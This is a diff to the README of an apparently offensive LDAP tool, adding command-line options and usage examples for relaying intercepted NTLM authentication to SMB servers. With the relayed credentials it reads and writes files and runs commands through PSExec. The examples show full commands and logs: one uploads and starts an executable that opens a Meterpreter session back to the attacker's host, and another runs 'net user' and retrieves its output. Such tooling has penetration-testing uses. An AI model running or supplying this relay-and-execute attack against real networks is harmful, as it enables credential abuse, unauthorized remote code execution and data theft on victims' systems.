@@ -54,6 +54,48 @@ LDAP Swiss Army Knife
                              Keystore type
                                Default: JKS
       --nostarttls           Disable StartTLS
+      --ntlm-relay=<relayServer>
+                             Relay intecepted NTLM exchange to SMB server for PSExec
+      --psexec-cmd=<psexecCMD>
+                             Using the relayed credentials, run system command using
+                               PSExec
+      --psexec-cmd-log=<psexecCMDLog>
+                             Redirect CMD command output to file (filesystem path)
+      --psexec-cmd-script-loc=<psexecCMDScriptLoc>
+                             SHARE/Path for launcher script file used for output
+                               redirection
+                               Default: /ADMIN$/Temp/
+      --psexec-cmd-script-path=<psexecCMDScriptPath>
+                             Local filesystem for launcher script file used for
+                               output redirection
+                               Default: C:\Windows\Temp\
+      --psexec-display-name=<psexecDisplayName>
+                             Display name of service used for PSExec
+      --psexec-psh-encode    Encode PSExec Powershell Payload
+      --psexec-script=<psexecPSHScript>
+                             Using the relayed credentials, run Powershell code
+                               using PSExec (size limits apply)
+      --psexec-script-file=<psexecPSHScriptFile>
+                             Using the relayed credentials, run Powershell code from
+                               script file using PSExec (size limits apply)
+      --psexec-service-name=<psexecServiceName>
+                             Name of service used for PSExec
+      --relay-read-charset=<readFileCharset>
+                             Charset for reading remote files, only relevant when
+                               outputting
+                               Default: UTF-8
+      --relay-read-from=<readFileSource>
+                             Using the relayed credentials, read file from this
+                               target share/path (SHARE/path/)
+      --relay-read-to=<readFileTarget>
+                             Local file to store the read file data, leave empty for
+                               stdout
+      --relay-write-file=<writeFileSource>
+                             Using the relayed credentials, write this local file to
+                               the server
+      --relay-write-to=<writeFileTarget>
+                             Using the relayed credentials, write file to this
+                               target share/path (SHARE/path/)
       --request-log          Log all requests
       --schemaless           Don't provide any schema
       --server-base-dn=<baseDN>
@@ -174,3 +216,51 @@ Options:
 For all requests returns a serialized Java Objects.
 When a JNDI client makes a request with lookup() semantics,
 the provided data will be deserialized.
+
+
+## NTLM Relaying
+ 
+The LDAP servers allow forwarding the NTLM exchange to a remote SMB server.
+Often, this grants access to the targeted servers files and RPC interfaces
+with the permissions of the authenticating user account.
+
+Three basic operations on the target server are implemented:
+- reading files
+- executing system commands and powershell (PSExec/SMBExec)
+- writing files
+
+The order of operations is a convenient write/execute/read.
+
+
+For example, upload and launch a meterpreter instance:
+```
+java -jar target/ldap-swak-0.0.1-SNAPSHOT-all.jar ke -p 1389 --ntlm-relay 192.168.56.101 --relay-write-file /tmp/test.exe --relay-write-to 'ADMIN$/Temp/foo.exe' --psexec-cmd "C:\\Windows\\Temp\\foo.exe"
+10:36:53.789 INFO FakeServer - Starting StartTLS listener on *:1389
+10:36:56.278 INFO PassTheHashNTLMSASLBindHandler - Have NTLM login administrator@DESKTOP-L96LL3H
+10:36:56.325 INFO PassTheHashRunner - Command line %COMSPEC% /b /c start /b /min C:\Windows\Temp\foo.exe
+10:36:56.333 INFO PassTheHashRunner - Service already exists
+10:36:56.337 INFO PassTheHashRunner - Recreated service
+10:36:56.355 INFO PassTheHashRunner - Service start timeout, expected: this is not an actual service binary
+
+
+[*] Meterpreter session 4 opened (192.168.56.1:8443 -> 192.168.56.101:49696) at 2019-02-19 10:36:56 +0100
+```
+
+Or, execute a system command and get it's output:
+```
+java -jar target/ldap-swak-0.0.1-SNAPSHOT-all.jake -p 1389 --ntlm-relay 192.168.56.101  --psexec-cmd "net user" --psexec-cmd-log C:\\Windows\\Temp\\test.log --relay-read-from 'ADMIN$/Temp/test.log'
+10:39:09.154 INFO FakeServer - Starting StartTLS listener on *:1389
+10:39:12.564 INFO PassTheHashNTLMSASLBindHandler - Have NTLM login administrator@DESKTOP-L96LL3H
+10:39:12.600 INFO PassTheHashRunner - Command line %COMSPEC% /b /c start /b /min C:\Windows\Temp\launch-1550569151302.cmd
+10:39:12.610 INFO PassTheHashRunner - Service already exists
+10:39:12.614 INFO PassTheHashRunner - Recreated service
+10:39:12.632 INFO PassTheHashRunner - Service start timeout, expected: this is not an actual service binary
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+mbechler                 WDAGUtilityAccount       
+The command completed with one or more errors.
+```
+ 
